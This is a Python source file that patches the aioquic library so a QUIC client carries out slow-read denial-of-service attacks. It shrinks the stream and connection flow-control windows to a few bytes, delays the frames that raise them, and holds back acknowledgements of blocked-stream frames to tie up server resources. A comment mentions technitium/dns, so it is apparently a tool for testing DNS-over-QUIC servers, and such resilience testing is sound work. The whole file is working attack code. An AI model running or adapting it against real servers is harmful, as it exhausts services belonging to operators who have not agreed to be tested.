import functools
from aioquic.quic.packet_builder import QuicPacketBuilder
from aioquic.quic.recovery import QuicPacketSpace
from aioquic.quic.stream import QuicStream
from aioquic.quic.packet import QuicFrameType, NON_ACK_ELICITING_FRAME_TYPES
from aioquic.quic import connection
from aioquic.quic.connection import Limit, MAX_STREAM_DATA_FRAME_CAPACITY, CONNECTION_LIMIT_FRAME_CAPACITY
from utils import calculate_slowrate_wait_time


class SlowReadMaxStreamDataMixin:
    initial_max_stream_data: int = 10
    max_stream_data_increment: int = 2

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._quic: connection.QuicConnection

        # Max data that the server is allowed to send per stream
        # Before sending more data, the client has to increase the limit
        self._quic._local_max_stream_data_bidi_local = self.initial_max_stream_data

        # Monkey-patch quic handler to perform slow read attacks
        self.per_stream_limit_tracking = {}
        self._quic._write_stream_limits = self.write_stream_limits
        # Do not immediately ACK STREAM_DATA_BLOCKED frames.
        # Immediate ACK causes STREAM_DATA_BLOCKED spamming in technitium/dns
        connection.NON_ACK_ELICITING_FRAME_TYPES = frozenset(NON_ACK_ELICITING_FRAME_TYPES.union([
            QuicFrameType.STREAM_DATA_BLOCKED,
        ]))

    def write_stream_limits(self, builder: QuicPacketBuilder, space: QuicPacketSpace, stream: QuicStream):
        if stream.max_stream_data_local == 0:
            return
        
        # Delay sending of MAX_STREAM_DATA per stream
        stream_limit_tracking = self.per_stream_limit_tracking.setdefault(stream.stream_id, {
            'can_write_stream_limits': False,
            'pending_write_stream_limits': None,
        })
        if not stream_limit_tracking['can_write_stream_limits']:
            if not stream_limit_tracking['pending_write_stream_limits']:
                # Delay sending MAX_STREAM_DATA frames
                stream_limit_tracking['pending_write_stream_limits'] = self._loop.call_later(
                    delay=calculate_slowrate_wait_time(self._quic),
                    callback=functools.partial(self.do_write_stream_limits, stream_limit_tracking),
                )
            return

        # Following code is based on the original write_stream_limits method
        if stream.max_stream_data_local and stream.receiver.highest_offset + self.max_stream_data_increment > stream.max_stream_data_local:
            stream.max_stream_data_local += self.max_stream_data_increment
            self._quic._logger.info(
                "Stream %d local max_stream_data raised to %d",
                stream.stream_id,
                stream.max_stream_data_local,
            )
        if stream.max_stream_data_local_sent != stream.max_stream_data_local:
            buf = builder.start_frame(
                QuicFrameType.MAX_STREAM_DATA,
                capacity=MAX_STREAM_DATA_FRAME_CAPACITY,
                handler=self._quic._on_max_stream_data_delivery,
                handler_args=(stream,),
            )
            buf.push_uint_var(stream.stream_id)
            buf.push_uint_var(stream.max_stream_data_local)
            stream.max_stream_data_local_sent = stream.max_stream_data_local

            # log frame
            if self._quic._quic_logger is not None:
                builder.quic_logger_frames.append(
                    self._quic._quic_logger.encode_max_stream_data_frame(
                        maximum=stream.max_stream_data_local, stream_id=stream.stream_id
                    )
                )

    def do_write_stream_limits(self, stream_limit_tracking):
        stream_limit_tracking['can_write_stream_limits'] = True
        self.transmit()
        stream_limit_tracking['can_write_stream_limits'] = False
        stream_limit_tracking['pending_write_stream_limits'] = None


class SlowReadMaxDataMixin:
    initial_max_data: int = 10
    max_data_increment: int = 2

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._quic: connection.QuicConnection

        # Max data that the server is allowed to send per stream
        # Before sending more data, the client has to increase the limit
        self._quic._local_max_data = Limit(
            frame_type=QuicFrameType.MAX_DATA,
            name="max_data",
            value=self.initial_max_data,
        )

        # Monkey-patch quic handler to perform slow read attacks
        self.can_write_connection_limits = False
        self.pending_write_connection_limits = None
        self._quic._write_connection_limits = self.write_connection_limits

    def write_connection_limits(self, builder: QuicPacketBuilder, space: QuicPacketSpace):
        if not self.can_write_connection_limits:
            if not self.pending_write_connection_limits:
                self.pending_write_connection_limits = self._loop.call_later(
                    delay=calculate_slowrate_wait_time(self._quic),
                    callback=self.do_write_connection_limits,
                )
            return
        
        # Following code is based on the original write_connection_limits method
        for limit in (
            self._quic._local_max_data,
            self._quic._local_max_streams_bidi,
            self._quic._local_max_streams_uni,
        ):
            if limit.frame_type == QuicFrameType.MAX_DATA and limit.used + self.max_data_increment > limit.value:
                limit.value += self.max_data_increment
            elif limit.frame_type != QuicFrameType.MAX_DATA and limit.used * 2 > limit.value:
                limit.value *= 2
                
            if limit.value != limit.sent:
                self._quic._logger.info("Local %s raised to %d", limit.name, limit.value)
                buf = builder.start_frame(
                    limit.frame_type,
                    capacity=CONNECTION_LIMIT_FRAME_CAPACITY,
                    handler=self._quic._on_connection_limit_delivery,
                    handler_args=(limit,),
                )
                buf.push_uint_var(limit.value)
                limit.sent = limit.value

                # log frame
                if self._quic._quic_logger is not None:
                    builder.quic_logger_frames.append(
                        self._quic._quic_logger.encode_connection_limit_frame(
                            frame_type=limit.frame_type,
                            maximum=limit.value,
                        )
                    )

    def do_write_connection_limits(self):
        self.can_write_connection_limits = True
        self.transmit()
        self.can_write_connection_limits = False
        self.pending_write_connection_limits = None
